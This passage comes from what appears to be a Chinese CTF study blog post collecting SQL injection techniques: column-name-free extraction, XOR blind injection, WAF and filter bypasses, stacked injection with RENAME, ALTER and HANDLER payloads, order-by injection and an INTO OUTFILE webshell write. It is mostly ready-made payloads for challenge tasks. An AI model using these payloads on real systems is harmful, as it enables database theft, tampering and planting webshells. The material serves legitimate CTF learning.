+<h4 id="已知表名情况下爆破列名"><a href="#已知表名情况下爆破列名" class="headerlink" title="已知表名情况下爆破列名"></a>已知表名情况下爆破列名</h4><p>利用(select 1,2,3,4,5 union select * from table_name)alias<br>此处需要反引号不被过滤<br>获得一个将所有列名用数字表示的表，然后<code>select `3` from (select 1,2,3,4,5 union select * from table_name)alias</code>即可将第三列无需列名的选出<br>结合实际情况的payload<br>select author_id,title from posts where author_id&#x3D; <code>-1 union select 1,(select group_concat(`3`) from (select 1,2,3,4,5 union select * from table_name)alias where 1=&#39;1&#39; limit 0,1)</code> limit是保证查出来的数据只有一个<br>select 1,2,3,4,5即该表拥有五个列，group_concat将整个列的数据拼接起来，where 1&#x3D;’1’为无效语句，用来闭合引号</p>
+<p>逗号被过滤时多取几个别名，可以不用逗号<br><code>select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from table2)x;</code></p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/4105#toc-0">在不知道 MySQL 列名的情况下泄露数据的 SQL 注入技巧</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a></p>
+<h3 id="异或盲注入"><a href="#异或盲注入" class="headerlink" title="异或盲注入"></a>异或盲注入</h3><p>除去union联合注入，使用异或(^)盲注入也是一种办法<br>这种方法比较容易用括号拼出来语句，比较使用，但是注入时需注意符号优先级，比如在^面前，大小于号和等号的优先级是不一样的，最简单的解决方案就是把该异或判断里面的所有内容再用一个括号括起来即可<br>样例payload：<br><code>?id=1&#39;^(left((select(database())),1)&lt;&#39;q&#39;)^&#39;1</code><br>纯用括号的payload：<br><code>?id=1&#39;^(left((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),9)=&#39;emails,re&#39;)^&#39;1</code><br>用group_concat函数把所有的表名连接起来，以逗号分隔，不需使用limit，即可直接猜解表名<br><strong>一定要注意这里要把后面注入的语句整体用括号括起来！！！不然就会存在异或优先级不同导致注入失败</strong></p>
+<h4 id="异或注入测试被过滤字符"><a href="#异或注入测试被过滤字符" class="headerlink" title="异或注入测试被过滤字符"></a>异或注入测试被过滤字符</h4><p><code>?id=1&#39;^length(&#39;测试字符串&#39;)&gt;0 #</code>即可测试被测试字符串是否被替换为空，进行被过滤项的测试</p>
+<h3 id="select和union被过滤的注入"><a href="#select和union被过滤的注入" class="headerlink" title="select和union被过滤的注入"></a>select和union被过滤的注入</h3><p>遇到只是去掉第一次出现的select和union时双写即可<code>selselectect</code><br>有的只过滤全大写或全小写，大小写混搭即可<code>UniOn sEleCT</code><br>括号打断union select，即<code>union(select xxxx)</code></p>
+<h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><p>内联注释的作用就是时其他数据库将该内容视为注释，而MySQL则将该内容当做正常代码处理，提高MySQL与其他数据库的兼容性，同时内联注释中可以添加数字作为版本号，使得该语句只能在目前版本大于等于该版本号的情况下才能运行，可以此绕过部分检测<br>内联注释格式为<code>/*!xxxxxx*/</code><br><code>/*!union*/ /*!50010select*/</code>就可以绕过对<code>union select</code>的检测</p>
+<h4 id="堆叠注入不使用select"><a href="#堆叠注入不使用select" class="headerlink" title="堆叠注入不使用select"></a>堆叠注入不使用select</h4><p>刚做了一个题，没得select我是真的没办法，见下文堆叠注入</p>
+<h3 id="逗号被过滤的注入"><a href="#逗号被过滤的注入" class="headerlink" title="逗号被过滤的注入"></a>逗号被过滤的注入</h3><p>主要存在于盲注使用left，limit，substr函数等场合<br>limit使用offset绕过<br>样例payload：<br><code>select * from user limit 1 offset 0</code><br>substr()和mid()函数可以使用from to的方法绕过逗号<br>样例payload：<br><code>select substr(database() from 1 for 1)</code> 这里for 1指截取一位，实际上不要也可以（因为有时候or也没得了）</p>
+<h4 id="join函数辅助注入"><a href="#join函数辅助注入" class="headerlink" title="join函数辅助注入"></a>join函数辅助注入</h4><p>需在可使用union联合注入时使用，主要用于逗号被过滤的情形<br>使用join语句可以将多个表拼接到一起进行查询，这时每个表需要设置一个别名，且注意查询数要与列数一致，假设有三列，样例payload:<code>union select * from ((select 1)a join (select 2)b join (select database())c)</code>，一个select语句内可用group_concat等函数进行更深层次的查询<br>马师傅用的一个payload<br><code>UNION SELECT * from ((select+1)a join (select 234)b join(select 3)c join(select group_concat(mdzz.3) from (select * from (select * from (select 1)asf join (select+2)adf join (select 3)asdnfio)ooo union select * from fl111aa44a99g)mdzz)d)</code><br>(说实话我没看懂为什么套了这么多层union select，我第一层直接查flag不就完了吗)</p>
+<h3 id="大小于号被过滤的注入"><a href="#大小于号被过滤的注入" class="headerlink" title="大小于号被过滤的注入"></a>大小于号被过滤的注入</h3><p>同样常见于盲注，需要进行比较加快判断（也可以自己写脚本遍历就不怕了）<br>greatest函数和least函数返回参数列表中的最大&#x2F;小值<br>所以一个比较字符是否大于64的语句可以写为：<br><code>greatest(ascii(substr(database(),0,1)),64)=64</code></p>
+<h3 id="等号被过滤的注入"><a href="#等号被过滤的注入" class="headerlink" title="等号被过滤的注入"></a>等号被过滤的注入</h3><p>等号可以直接用like语句替换，也可以使用&lt;&gt;不等号进行代替</p>
+<h3 id="括号-被过滤的注入-union盲注入"><a href="#括号-被过滤的注入-union盲注入" class="headerlink" title="括号()被过滤的注入 | union盲注入"></a>括号()被过滤的注入 | union盲注入</h3><p>当括号被禁用时，SQL的函数便全部不能使用了，这个时候可以使用union盲注入，利用order by排序查询结果进行判断，具体使用看那篇[HBCTF]大美西安</p>
+<h3 id="具有WAF防御的注入"><a href="#具有WAF防御的注入" class="headerlink" title="具有WAF防御的注入"></a>具有WAF防御的注入</h3><p>应该是有两个服务器，一个外层服务器将数据进过判别后再提交至内部服务器进行处理，由于两个服务器对同名参数的处理不同，可以创建两个同名参数，一个是正常数据另一个是恶意数据进行WAF防御的绕过<br>由于环境问题没有自己测试，只能贴一个文章了<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/nzjdsds/article/details/77758824">https://blog.csdn.net/nzjdsds/article/details/77758824</a></p>
+<h3 id="引号被转义"><a href="#引号被转义" class="headerlink" title="引号被转义"></a>引号被转义</h3><p>1.宽字节注入<br> 这种情况适用于取消用于打破闭合的单个引号的转义，在gbk编码中一个汉字占两个字节，utf-8中一个汉字占三个字节<br> 在gbk字符集中，当第一个字符超过128时，则认为接下来两个字符为一个宽字符，我们可以用这个办法将增添的引号给变成一个汉字从而绕过。<br> 构造<code>?id=1%aa&#39;</code>即可<br> 这里我犯过一个很智障的毛病，在post提交数据的时候直接输入了%aa妄图绕过，结果当然是出问题，正确方法是通过bp抓包修改，这样才能urlencode<br>2.十六进制编码代替<br> 当爆列名时存在一个叫’user’的表名且引号被转义时，我们可以使用它的十六进制进行替换，即将user变为0x7573657273即可</p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>据说功能十分强大，具体编码有hex，urlencode，ASCII之类的<br>例如：CHAR()函数进行拼接：<code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code>即可获得’test’字符串</p>
+<h4 id="urlencode绕过waf"><a href="#urlencode绕过waf" class="headerlink" title="urlencode绕过waf"></a>urlencode绕过waf</h4><p>waf可以理解为服务器前的一个屏障，负责过滤输入的内容，而有的waf是直接提取我们的query_string，这种PHP性质的检测不会对我们的urlencode的数据进行解码，我们就可以以urlencode的形式进行绕过<br>例如：<code>u%6eion</code>就可以进行对union的绕过</p>
+<h4 id="二次解码绕过"><a href="#二次解码绕过" class="headerlink" title="二次解码绕过"></a>二次解码绕过</h4><p>有的网站存在着对url的二次解码，当我们的请求发送到服务器时，会发生第一次url解码，若此时还存在其他设置（如开启GPC），则会存在二次解码，此时我们可以使用<code>%2527</code>这样的语句通过二次解码构造注入<br>%25url解码为%，%27url解码为’</p>
+<h3 id="MySQL字符集绕过"><a href="#MySQL字符集绕过" class="headerlink" title="MySQL字符集绕过"></a>MySQL字符集绕过</h3><p>MySQL默认字符集为Latin1，当用户端的字符集为utf-8时，存在一个字符集转换过程，此时，不完整的utf-8编码会被舍弃，可以绕过类似于<code>&#39;username&#39;===&#39;admin&#39;</code>的条件。<br>具体情况贴一个博文<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>SQL语句后台查询时以;为分隔，如果我们在一次查询中使用分号隔开语句，即可实现执行两个语句。<br>堆叠注入有时候不能得到返回值，所以需要用sleep之类的语句进行延时验证。但一般无法使用select时才会使用堆叠注入，因此可以使用<code>DO</code>语句进行执行，<code>DO</code>语句结束一个专门执行表达式的语句，在执行表达式上作为SELECT的替代品，eg:<code>DO sleep(5)</code></p>
+<h3 id="堆叠注入和union-select的区别"><a href="#堆叠注入和union-select的区别" class="headerlink" title="堆叠注入和union select的区别"></a>堆叠注入和union select的区别</h3><blockquote>
+<p>union injection （联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是<strong>任意的语句</strong>。 </p>
+</blockquote>
+<p>因为如果查询语句为<code>select * from users where username = $username</code>，使用union select就仍处于select语句下，而使用堆叠注入则可以重开一个语句，进行insert，delete等操作。</p>
+<h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>并不是所有的数据库都允许在一行中执行两个查询语句，某些API也会禁止或者开启这项功能，MySQL的某些版本可以执行堆叠注入，而Oracle就不允许这种操作，并且由于权限问题你也不一定能对数据进行修改</p>
+<h3 id="不使用select语句进行注入"><a href="#不使用select语句进行注入" class="headerlink" title="不使用select语句进行注入"></a>不使用select语句进行注入</h3><p>本题来自强网杯2019随便注</p>
+<h4 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h4><p>堆叠注入之后，我们可以执行任意语句，所以可以使用<code>show</code>来对数据进行展示<br><code>show database</code> <code>show tables/cloumns from xxxx</code>就可以直接对数据进行查询<br>最后一步没法使用show来进行查询了，而这里的语句应该为<code>select * from words where id=</code>，显示位由word表中的数据占据，且新开语句中无法使用select，这时我们将现在的表改名为words，还需将列对应修改为id和data，就能通过正常查询得到数据</p>
+<p><code>`</code>是SQL中的转义字符，当我们的表名可能引起冲突时需要用<code>`</code>将其包围，保险起见可以将所有的表名用此包围<br>修改语句要在一次内做完，不然你先把words给改掉了，下次查询的时候先执行的select语句报错，后面还想把1919810931114514改成words就没戏了，同理还有对应的id和data<br>修改语句如下：<code>rename table `tablename` to `new_tablename` </code><br>增加数字列<br><code> alter table `tablename` add `columnname` int unsigned not Null auto_increment primary key</code><br>增加字符列<br><code>alert table `tablename` change `columnname` `newcolumnname`</code><br>抄一个完整的payload<br><code>?inject=1&#39;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</code></p>
+<p>这个句子将flag改为id且设置了其类型为可变字符串，设置字符集为utf-8<br>由于我们并不知道现在的flag是多少，所以我们以?id&#x3D;1’ or 1&#x3D;1的形式查询到flag</p>
+<h4 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h4><p>玄妙的拼凑语句执行<br><code>use information_schema;set @sql=concat(&#39;s&#39;,&#39;elect column_name from columns wher&#39;,&#39;e table_name=&quot;1919810931114514&quot;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;--+</code><br>感觉更加万能了，可以随意绕过</p>
+<h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>堆叠注入，强网杯随便注强化版，给了一个超级过滤，直接把上面的所有方法给ban了<br><code>preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>拼凑语句需要set和prepare，挂了，利用现有查询语句查需要rename，挂了，基本注入需要select，挂了，全挂。人傻了<br>最后师傅说用handler语句代替select堆叠注入，搜不到这个语句，最最最后直接搜wp才搜到这个东西。<br>这个语句是mysql独有的，其他数据库并不能使用</p>
+<pre class=" language-mysql"><code class="language-mysql">handler table_name open;
+handler table_name read first/next; #读第一行数据或读下一行数据
+</code></pre>
+<p>可以先用show tables;之类的语句摸清楚结构，然后用handler查询<br>payload: <code>1&#39;;handler open FlagHere;handler FlagHere read first;#</code></p>
+<h3 id="修改SQL配置的新知识"><a href="#修改SQL配置的新知识" class="headerlink" title="修改SQL配置的新知识"></a>修改SQL配置的新知识</h3><p>以SUCTF的easy_sql为例，这里后台的查询语句为<code>select $query || flag from Flag</code>（大佬wp说是判断出来了，我是判断不出来），测试之后发现注释符被过滤，or和union等常用语句被过滤，试了半天最后发现是整形注入，差点忘了这茬，但是可以使用堆叠注入。爆到列为Flag之后没法继续做了，这时拿出我们的新知识，修改<code>||</code>或运算符为连接符，就可以直接把flag给带出来啦。<br>payload<code> 1;set sql_mode=pipes_as_concat;select 1</code></p>
+<p>这个题没出完，使用出现了很多低级的非预期解，比如<code>*,1</code>使得查询语句为<code>select *,1 || flag from Flag</code>这里1和后面的或结合，select  *就获取了全部数据</p>
+<h4 id="ps-1"><a href="#ps-1" class="headerlink" title="ps"></a>ps</h4><p>SQL字符串弱类型比较和PHP字符串和数字弱类型比较一致</p>
+<h2 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h2><p>该类注入的注入语句为<code>$sql = &quot;SELECT * FROM users ORDER BY $id</code><br>此时我们使用<code>?id=1 desc</code>和<code>?id=1 asc</code>（升降序）观察结果有无变化，判断是否存在order by注入。<br>order by 不同于的我们在 where 后的注入点，不能使用 union 进行注入</p>
+<h3 id="rand-注入"><a href="#rand-注入" class="headerlink" title="rand()注入"></a>rand()注入</h3><p><code>?id=1 and rand(true) 或 rand(false)</code>时，返回的结果是不一致的，且重复使用rand(true)的结果不会变化，因此可以使用rand()函数进行bool盲注入</p>
+<h3 id="时间盲注入"><a href="#时间盲注入" class="headerlink" title="时间盲注入"></a>时间盲注入</h3><p>order by语句后可以以<code>?id=1 and if()</code>这样的形式接一个语句，（不知道为什么）无论if结果真伪与否都不会影响order by的结果，但是我们这里可以使用时间盲注产生延迟</p>
+<h3 id="procedure-analyse报错注入"><a href="#procedure-analyse报错注入" class="headerlink" title="procedure analyse报错注入"></a>procedure analyse报错注入</h3><p>是报错注入的一种，使用方法<code>procedure analyse(extractvalue(.....))</code></p>
+<h3 id="聚合函数注入"><a href="#聚合函数注入" class="headerlink" title="聚合函数注入"></a>聚合函数注入</h3><p>这里也可以使用聚合函数进行注入<code>?id=1&#39; and (select....聚合注入语句)</code></p>
+<h3 id="导入木马注入"><a href="#导入木马注入" class="headerlink" title="导入木马注入"></a>导入木马注入</h3><p>order by后可以使用<code>?id=1&#39; into outfile &#39;路径&#39;  lines terminated by 0x....</code>0x后为被16进制转码的文件，将木马写入该路径下</p>
+<h2 id="SQL弱类型"><a href="#SQL弱类型" class="headerlink" title="SQL弱类型"></a>SQL弱类型</h2><p>在整型类变量作为查询内容时，一大过滤方法是直接将数据转化为整形。字符串转数字的规则同PHP，即以数字开头则转换为开头数字，否则为0</p>
+<h2 id="PDO-desc注入"><a href="#PDO-desc注入" class="headerlink" title="PDO desc注入"></a>PDO desc注入</h2><p>待研究</p>
+<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mp.weixin.qq.com/s?__biz=MzI2OTUzMzg3Ng==&mid=2247484074&idx=1&sn=2bcac1abf8364cc4040d2f3cb07e21d6&chksm=eadf9571dda81c678acffc2e79a4363d085e372428a14cb525e324c1e9e492a84d6d52b7d054&mpshare=1&scene=23&srcid=12167GnqMynTveY20gEIhScx&sharer_sharetime=1576496036398&sharer_shareid=ae6683d6c0e7df9a0b7c15e7cacf6b3c#rd">WriteUp | Magic key</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/3950">PDO场景下的SQL注入探究</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/wfzWebSecuity/p/12049920.html">https://www.cnblogs.com/wfzWebSecuity/p/12049920.html</a></p>
+<h2 id="PostgreSQL注入"><a href="#PostgreSQL注入" class="headerlink" title="PostgreSQL注入"></a>PostgreSQL注入</h2><p>与mysql存在一点的语法差异，where后面一定要跟bool表达式，pg_sleep返回的是void，就不能直接用，详见RoarCTF2020的SQL注入wp</p>
+<h2 id="MySQL-8-0特性"><a href="#MySQL-8-0特性" class="headerlink" title="MySQL 8.0特性"></a>MySQL 8.0特性</h2><p>引入了元组比较TABLE，VALUE等语句，可以不需要列名不需要SELECT语句的进行注入，也详见RoarCTF2020的wp</p>
+<h2 id="SQL中的字符截取函数"><a href="#SQL中的字符截取函数" class="headerlink" title="SQL中的字符截取函数"></a>SQL中的字符截取函数</h2><pre class=" language-mysql"><code class="language-mysql">Mid(version(),1,1)
+Substr(version(),1,1)
+Substring(version(),1,1)
+Lpad(version(),1,1)
+Rpad(version(),1,1)
+Left(version(),1)
+reverse(right(reverse(version()),1)
+</code></pre>
+<h2 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.jianshu.com/p/a63912d4b5ad">https://www.jianshu.com/p/a63912d4b5ad</a></p>
+<h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>这篇文章一开始都是我刚入门CTF写的了，零零散散记录了很多乱七八糟的trick，可能存在很多当时没懂乱写的东西，也就是谬误，但是现在也懒得重新再排版整理了。。。<br>说到底，当SQL预处理出现的时候，SQL注入基本上就不存在了，但是马师傅也曾经和我说过SQL预处理并不能保证绝对安全，在特殊位置的字段经过了预处理仍可能产生漏洞，不过到了这个层面，使用预处理基本上就与SQL注入无缘了<br>而实际实战中对SQL注入的过滤，基本上要么一个预处理封死，要么年久失修根本不设防，如上的trick们也就供大家玩CTF的时候作为一个小小的技巧罢了</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQLI/" rel="tag"># SQLI</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%5BXCTF%5D%20webtmp.html" rel="prev" title="XCTF 抗疫赛 webtmp">
+      <i class="fa fa-chevron-left"></i> XCTF 抗疫赛 webtmp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%5BEIS%202019%5Dezpop.html" rel="next" title="EIS2019 ezpop">
+      EIS2019 ezpop <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-injection"><span class="nav-number">1.</span> <span class="nav-text">SQL injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E6%97%A0%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">基础无过滤注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.1.</span> <span class="nav-text">union联合注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GXYCTF2019-BabySQli"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">[GXYCTF2019]BabySQli</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.2.</span> <span class="nav-text">基于错误的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RCTF2015-EasySQL"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">[RCTF2015]EasySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">双查询注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.3.</span> <span class="nav-text">盲注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Ebool%E7%9A%84%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">基于bool的盲注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">基于时间的盲注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8update%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.4.</span> <span class="nav-text">使用update语句的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#update%E5%90%8E%E5%8F%AF%E8%A7%81%E8%A2%AB%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">update后可见被更新数据的注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%89%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF%E5%9B%9E%E6%98%BE%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">有语法错误回显的注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.5.</span> <span class="nav-text">导出文件型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ps"><span class="nav-number">1.1.5.1.</span> <span class="nav-text">ps</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.6.</span> <span class="nav-text">基于错误的头部注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8insert%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.6.1.</span> <span class="nav-text">使用insert语句的注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84cookie%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.6.2.</span> <span class="nav-text">基于错误的cookie注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#limit%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.7.</span> <span class="nav-text">limit注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.8.</span> <span class="nav-text">整数溢出注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E9%98%B6%E6%9C%89%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">进阶有过滤注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="nav-number">1.2.1.</span> <span class="nav-text">过滤注释符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.2.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="nav-number">1.2.3.</span> <span class="nav-text">过滤空格</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E4%BD%8D%E7%BD%AE%E7%9A%84%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">部分位置的空格绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A5%E4%B8%80%E4%B8%AA%E8%B0%83%E4%BA%86%E5%A5%BD%E4%B9%85%E7%9A%84payload"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">补一个调了好久的payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bypass-infromation-schema"><span class="nav-number">1.2.4.</span> <span class="nav-text">bypass infromation_schema</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#innoDB%E5%BC%95%E6%93%8E%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">innoDB引擎绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sys%E5%BA%93%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">sys库绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#join%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.4.3.</span> <span class="nav-text">join无列名注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%B2%E7%9F%A5%E8%A1%A8%E5%90%8D%E6%83%85%E5%86%B5%E4%B8%8B%E7%88%86%E7%A0%B4%E5%88%97%E5%90%8D"><span class="nav-number">1.2.4.4.</span> <span class="nav-text">已知表名情况下爆破列名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.2.4.5.</span> <span class="nav-text">参考链接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%82%E6%88%96%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.5.</span> <span class="nav-text">异或盲注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E8%A2%AB%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">异或注入测试被过滤字符</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#select%E5%92%8Cunion%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.6.</span> <span class="nav-text">select和union被过滤的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-number">1.2.6.1.</span> <span class="nav-text">内联注释</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%BD%BF%E7%94%A8select"><span class="nav-number">1.2.6.2.</span> <span class="nav-text">堆叠注入不使用select</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%97%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.7.</span> <span class="nav-text">逗号被过滤的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 